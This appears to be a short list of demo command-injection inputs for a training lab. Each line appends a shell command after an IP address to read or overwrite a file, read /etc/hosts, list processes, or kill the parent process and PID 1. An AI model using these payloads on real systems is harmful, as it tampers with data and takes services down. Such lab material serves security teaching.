192.168.178.1; cat ./demo_files/command-injection/important-file-with-integrity.txt
192.168.178.1; echo 'changed-value-via-command-injection' > ./demo_files/command-injection/important-file-with-integrity.txt

192.168.178.1; cat /etc/hosts

192.168.178.1; kill -TERM $PPID

192.168.178.1; ps -ef

192.168.178.1; kill -9 1
